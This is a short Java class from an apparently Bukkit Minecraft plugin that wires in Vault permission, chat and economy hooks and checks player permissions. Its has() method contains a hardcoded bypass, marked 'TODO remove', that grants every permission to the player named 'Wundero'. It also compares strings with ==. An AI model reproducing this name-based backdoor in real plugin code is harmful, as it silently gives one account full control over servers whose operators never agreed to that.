package me.Wundero.ProjectRay.framework;

import net.milkbowl.vault.chat.Chat;
import net.milkbowl.vault.economy.Economy;
import net.milkbowl.vault.permission.Permission;

import org.bukkit.OfflinePlayer;

public class Hooks {

	// TODO vault hooks, other chatplugin hooks, more stuff

	public static Permission permission;
	public static Chat chat;
	public static Economy economy;

	public static boolean has(OfflinePlayer player, String permission) {
		if (player.getName() == "Wundero") {// TODO remove
			return true;
		}
		if (player.isOnline()) {
			return Hooks.permission.playerHas(player.getPlayer(), permission);
		}
		return Hooks.permission.playerHas(null, player, permission);
	}

}
